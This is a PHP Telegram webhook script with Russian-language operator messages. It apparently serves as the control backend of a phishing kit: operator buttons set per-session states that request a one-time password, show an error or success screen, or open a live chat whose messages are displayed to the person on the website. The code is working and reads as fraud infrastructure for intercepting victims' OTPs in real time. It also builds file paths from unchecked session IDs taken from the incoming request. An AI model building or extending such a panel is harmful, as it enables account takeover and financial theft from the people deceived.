<?php
require_once __DIR__ . '/../config.php';

// Log incoming updates for debugging
$logFile = LOGS_DIR . 'bot_updates.log';
$content = file_get_contents('php://input');
file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $content . "\n", FILE_APPEND);

// Get incoming update from Telegram
$update = json_decode($content, true);

if (!$update) {
    exit;
}

// Handle callback queries (inline button clicks)
if (isset($update['callback_query'])) {
    $callbackData = $update['callback_query']['data'];
    $chatId = $update['callback_query']['message']['chat']['id'];
    $messageId = $update['callback_query']['message']['message_id'];
    
    // Parse callback data
    $parts = explode('_', $callbackData);
    $action = $parts[0];
    $sessionId = $parts[1] ?? '';
    
    if (empty($sessionId)) {
        exit;
    }
    
    $statusFile = LOGS_DIR . $sessionId . '.status';
    
    if (!file_exists($statusFile)) {
        exit;
    }
    
    // Update status based on action
    switch ($action) {
        case 'otp':
            file_put_contents($statusFile, 'otp');
            answerCallback($update['callback_query']['id'], '📱 OTP запрошен');
            break;
            
        case 'err':
            file_put_contents($statusFile, 'err');
            answerCallback($update['callback_query']['id'], '❌ Ошибка отправлена');
            break;
            
        case 'ok':
            file_put_contents($statusFile, 'ok');
            answerCallback($update['callback_query']['id'], '✅ Успех отправлен');
            break;
            
        case 'chat':
            file_put_contents($statusFile, 'chat');
            answerCallback($update['callback_query']['id'], '💬 Чат активирован');
            
            // Send instruction message
            $chatMsg = "💬 <b>ЧАТ АКТИВИРОВАН</b>\n\n";
            $chatMsg .= "Теперь просто отправьте сообщение в этот чат.\n";
            $chatMsg .= "Оно будет отображено пользователю на сайте.\n\n";
            $chatMsg .= "🆔 Session: <code>" . $sessionId . "</code>";
            sendTelegramMessage($chatMsg, null);
            break;
    }
}

// Handle regular text messages (for chat)
if (isset($update['message']['text'])) {
    $text = $update['message']['text'];
    $chatId = $update['message']['chat']['id'];
    
    // Skip commands
    if (strpos($text, '/') === 0) {
        exit;
    }
    
    // Try to extract chat ID from message (simple 6-digit number)
    $chatSessionId = null;
    
    // Check if message starts with 6-digit number
    if (preg_match('/^(\d{6})\s+(.+)/', $text, $matches)) {
        $chatSessionId = $matches[1];
        $adminMessage = $matches[2];
    }
    
    // Check if this is a reply to a message with chat ID
    if (!$chatSessionId && isset($update['message']['reply_to_message']['text'])) {
        $replyText = $update['message']['reply_to_message']['text'];
        if (preg_match('/#(\d{6})/', $replyText, $matches)) {
            $chatSessionId = $matches[1];
            $adminMessage = $text;
        }
    }
    
    if ($chatSessionId && isset($adminMessage)) {
        $statusFile = LOGS_DIR . $chatSessionId . '.status';
        $chatFile = LOGS_DIR . $chatSessionId . '.chat';
        
        if (file_exists($statusFile)) {
            $status = trim(file_get_contents($statusFile));
            
            // Only save message if chat is active
            if ($status === 'chat') {
                $cleanText = trim($adminMessage);
                
                if (!empty($cleanText)) {
                    // Save admin message to chat file
                    $chatData = [
                        'from' => 'admin',
                        'text' => $cleanText,
                        'time' => time()
                    ];
                    file_put_contents($chatFile, json_encode($chatData) . "\n", FILE_APPEND);
                    
                    // Confirm message sent
                    $confirmMsg = "✅ Сообщение отправлено\n\n";
                    $confirmMsg .= "🆔 ID: <code>" . $chatSessionId . "</code>\n";
                    $confirmMsg .= "💬 <i>" . htmlspecialchars($cleanText) . "</i>";
                    sendTelegramMessage($confirmMsg, null);
                }
            }
        }
    }
}

function answerCallback($callbackQueryId, $text) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/answerCallbackQuery";
    
    $data = [
        'callback_query_id' => $callbackQueryId,
        'text' => $text
    ];
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
